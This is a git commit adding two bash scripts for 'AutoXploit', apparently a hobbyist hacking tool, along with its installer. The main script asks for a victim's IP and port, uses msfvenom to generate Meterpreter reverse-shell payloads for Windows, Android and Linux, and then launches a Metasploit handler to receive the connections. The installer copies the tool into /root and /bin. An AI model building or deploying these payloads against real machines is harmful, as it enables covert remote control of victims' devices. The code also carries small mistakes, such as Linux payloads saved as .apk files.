f9eecfbd4170d6e53d1b35a1babd985b8941cb95
Yashvendra <yashkashyap00720@gmail.com>
2019-12-14 15:50:43 +0530

    Adding source Files

---
+++ autoxploit.sh
@@ -0,0 +1,260 @@
+#!/bin/bash
+Black='\033[1;30m'        # Black
+Red='\033[1;31m'          # Red
+Green='\033[1;32m'        # Green
+Yellow='\033[1;33m'       # Yellow
+Blue='\033[1;34m'         # Blue
+Purple='\033[1;35m'       # Purple
+Cyan='\033[1;36m'         # Cyan
+White='\033[1;37m'        # White
+NC='\033[0m'
+blue='\033[0;34m'
+white='\033[0;37m'
+lred='\033[0;31m'
+
+root=$( id -u )
+folder='~/Desktop/payloads'
+
+
+
+autoxploitTitle () {
+    echo -e "\033[1;31m  \t
+  \t░█▀█░█░█░▀█▀░█▀█░█░█░█▀█░█░░░█▀█░▀█▀░▀█▀
+  \t░█▀█░█░█░░█░░█░█░▄▀▄░█▀▀░█░░░█░█░░█░░░█░
+  \t░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░▀▀▀░░▀░
+       \033[1;36m--=By: Yashvendra Kashyap a.k.a y_k_007=--     
+";
+
+}
+
+target () {
+    echo -ne "\n${Blue}[#] Enter IP of the victim's machine: ${White}"; read ip
+    echo -ne "${Blue}[#] Enter a Port no.: ${White}"; read port
+    echo -ne "${Blue}[#] Enter the FILE name: ${White}"; read file
+}
+
+windows () {
+    clear
+    autoxploitTitle 
+    echo -e "\n"
+    sleep 0.3
+    echo -e "${Blue}+-------------------------------------------------------+"
+    echo -e "+\t${Green}Available Payloads for ${Yellow}[${Purple}Windows${Yellow}]   ${Blue}             +"
+    echo -e "${Blue}+-------------------------------------------------------+${NC}"
+    sleep 0.3
+    echo -ne "${Blue}+ "
+    echo -e "${White}[1] ${Purple}windows/meterpreter/reverse_tcp           ${Blue}        +"
+    echo -e "+ ${White}[2] ${Purple}windows/meterpreter/reverse_http         ${Blue}         +"
+    echo -e "+ ${White}[3] ${Purple}windows/meterpreter/reverse_tcp_dns         ${Blue}      +"
+    echo -e "${Blue}+-------------------------------------------------------+"
+    sleep 0.3
+    echo -ne "${Green}[#] Choose a payload: ${White}" 
+    read payloadWindow
+
+    case  $payloadWindow  in
+
+        1)
+        target
+        echo
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
+        payload='windows/meterpreter/reverse_tcp' ;;
+
+        2)
+        target
+        echo
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
+        payload='windows/meterpreter/reverse_https' ;;
+
+        3)
+        target
+        echo
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
+        payload='windows/meterpreter/reverse_tcp_dns' ;;
+
+        *)
+        echo -e "${Cyan}[*] INVALID CHOICE!" 
+       	sleep 1 
+      	exit ;;
+
+    esac
+}
+
+android () {
+    clear
+    autoxploitTitle
+    echo -e "\n"
+    echo -e "${Blue}+-------------------------------------------------------+"
+    echo -e "+\t${Green}Available Payloads for ${Yellow}[${Purple}Android${Yellow}]   ${Blue}             +"
+    echo -e "${Blue}+-------------------------------------------------------+${NC}"
+    sleep 0.3
+    echo -ne "${Blue}+ "
+    echo -e "${White}[1] ${Purple}android/meterpreter/reverse_tcp           ${Blue}        +"
+    echo -e "+ ${White}[2] ${Purple}android/meterpreter/reverse_https         ${Blue}        +"
+    echo -e "+ ${White}[3] ${Purple}android/meterpreter/reverse_http         ${Blue}         +"
+    echo -e "${Blue}+-------------------------------------------------------+"
+    sleep 0.3
+    echo -ne "${Green}[#] Choose a payload: ${White}" 
+    read payloadAndro
+
+    case  $payloadAndro  in
+
+        1)
+        target
+        echo
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='android/meterpreter/reverse_tcp' ;;
+
+        2)
+        target
+        echo
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='android/meterpreter/reverse_https' ;;
+	
+	3)
+	target
+	echo 
+	  echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+	msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='android/meterpreter/reverse_http' ;;
+
+	* )
+        echo -e "${Cyan}[*] INVALID CHOICE!"  
+       	sleep 1 
+      	exit ;;
+
+    esac
+}
+
+linux (){
+    clear
+    autoxploitTitle
+    echo -e "\n"
+    echo -e "${Blue}+-------------------------------------------------------+"
+    echo -e "+\t${Green}Available Payloads for ${Yellow}[${Purple}Linux${Yellow}]     ${Blue}             +"
+    echo -e "${Blue}+-------------------------------------------------------+${NC}"
+    sleep 0.3
+    echo -ne "${Blue}+ "
+    echo -e "${White}[1] ${Purple}linux/x86/meterpreter_reverse_tcp         ${Blue}        +"
+    echo -e "+ ${White}[2] ${Purple}linux/x86/meterpreter_reverse_https       ${Blue}        +"
+    echo -e "+ ${White}[3] ${Purple}linux/x86/meterpreter_reverse_http       ${Blue}         +"
+    echo -e "${Blue}+-------------------------------------------------------+"
+    sleep 0.3
+    echo -ne "${Green}[#] Choose a payload: ${White}" 
+    read payloadlinux
+  
+    case  $payloadlinux  in
+
+        1)
+        target
+        echo
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='linux/x86/meterpreter_reverse_tcp' ;;
+
+        2)
+        target
+        echo
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='linux/x86/meterpreter_reverse_https' ;;
+
+        3)
+        target
+        echo
+          echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p linux/x86/meterpreter_reverse_http LHOST=$ip LPORT=$port R > ~/Desktop/payloads/$file.apk 2>/dev/null
+        payload='linux/x86/meterpreter_reverse_http' ;;
+
+        * )
+	echo -e "${Cyan}[*] INVALID CHOICE!"  
+        sleep 1
+        exit ;;
+
+    esac
+}
+
+
+if [ $root  != 0 ] ; then
+    echo -e "${Purple}[#] Run this Script as 'sudo'! "
+    sleep 2
+    exit
+fi
+
+if [ -e  $folder ] ; then
+    cd ~/Desktop/payloads
+else
+    mkdir ~/Desktop/payloads &&  cd ~/Desktop/payloads
+fi
+
+
+clear
+echo -e "\033[1;31m  \t
+  \t░█▀█░█░█░▀█▀░█▀█░█░█░█▀█░█░░░█▀█░▀█▀░▀█▀
+  \t░█▀█░█░█░░█░░█░█░▄▀▄░█▀▀░█░░░█░█░░█░░░█░
+  \t░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀░▀░░░▀▀▀░▀▀▀░▀▀▀░░▀░
+       \033[1;36m--=By: Yashvendra Kashyap a.k.a y_k_007=--     
+";
+
+sleep 0.3
+echo -e "${Yellow}[*] Payloads are available For-\n"
+sleep 0.3
+echo -e " ${White}[1] ${Blue}Windows"
+echo -e " ${White}[2] ${Blue}Android"
+echo -e " ${White}[3] ${Blue}Linux\n"
+sleep 0.3
+echo -ne "${Green}[#] Choose Victim's OS:${White} "  ;  read OS
+
+case  $OS  in
+
+    1)
+    windows;;
+
+    2)
+    android ;;
+
+    3)
+    linux ;;
+
+    * )
+    echo -e "${Cyan}[*] INVALID OPTION"  
+    sleep 1
+    echo -e "${Cyan}[*] Exiting..."
+    sleep 0.2 
+    exit ;;
+
+esac
+
+echo -e "${Purple}[*] Payload has been saved in the desktop folder '${Cyan}payloads${Purple}'"
+sleep 0.3
+echo -ne "${Green}[#] Do you want to automatically configure the handler and let it listen? [${Cyan}y${Green}/${Cyan}n${Green}]: ${White}" ; read p
+if [ $p  =  "y" ] ; then
+    clear
+    echo -e "${Green}[*] OPENING ${Purple}MSFCONSOLE${Green}... "
+    msfconsole -q -x "use multi/handler; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit "
+elif [ $p  =  "n" ] ; then
+    echo -e "${Cyan}[*] Byee! See you soon."  
+    sleep 0.2 
+    exit
+else
+    echo -e "${Cyan}[*] INVALID OPTION" 
+    sleep 0.2 
+    echo -e "${Cyan}[*] Exiting..."  
+    sleep 0.2 
+    exit
+fi
+
+
---
+++ install.sh
@@ -0,0 +1,74 @@
+#!/bin/bash
+
+white='\033[0;37m'
+NC='\033[0m'
+clear
+printf '\033]2; INSTALLER\a'
+echo -e "Press \e[1;33many key\e[0m to install the script..."
+read -n 1 
+clear
+
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+
+if [[ "$DIR" != "/root/autoxploit" ]]
+then
+	echo -e "I will try to install it for you..."
+	sleep 4
+	if [[ -d /root/autoxploit ]]
+	then 
+		rm -r /root/autoxploit
+	fi
+	mkdir /root/autoxploit
+	cp -r "$DIR"/* /root/autoxploit
+	chmod +x /root/autoxploit/install.sh
+	#gnome-terminal -- bash -c "sudo /root/autoxploit/install.sh; exec bash"
+fi
+echo -e "Installing AutoXploit..."
+sleep 1
+echo -e "Fixing permissions..."
+sleep 2
+chmod +x /root/autoxploit/autoxploit.sh
+clear
+echo -e "Copying script to /bin/autoxploit"
+cd /root/autoxploit
+cp /root/autoxploit/autoxploit.sh /bin/autoxploit
+clear
+while true
+do  
+	clear
+	echo -e "Are you \e[1;33mu\e[0mpdating or \e[1;33mi\e[0mnstalling the script?(\e[1;33mu\e[0m/\e[1;33mi\e[0m): "
+	echo -e "Only use 'i' for the first time."
+	read UORI
+	if [[ "$UORI" = "u" ]]
+	then 
+		clear 
+		echo -e "This feature is currently under construction.."
+		sleep 3
+		exit
+	elif [[ "$UORI" = "i" ]]
+	then 
+		clear
+		BASHCHECK=$(cat ~/.bashrc | grep "/bin/autoxploit")
+		if [[ "$BASHCHECK" != "" ]]
+		then 
+			echo -e "I SAID USE i ONLY ONE TIME..........."
+			sleep 3
+			break
+		fi
+		echo -e "Adding AutoXploit to PATH so you can access it from anywhere"
+		sleep 1
+		export PATH=/bin/autoxploit:$PATH
+		sleep 1
+		echo "export PATH=/bin/autoxploit:$PATH" >> ~/.bashrc
+		sleep 1
+		clear
+		break
+	fi
+done
+sleep 1
+echo -e "Installation is finished. Type 'sudo autoxploit' to launch the script after we exit."
+sleep 0.5
+echo -en "Starting AutoXploit"; sleep 0.5 ;echo -en "." ;sleep 0.5 ;echo -en "." ;sleep 0.5 ;echo -en "." ;sleep 0.5 ;echo -en "." ;
+sudo autoxploit
+
+
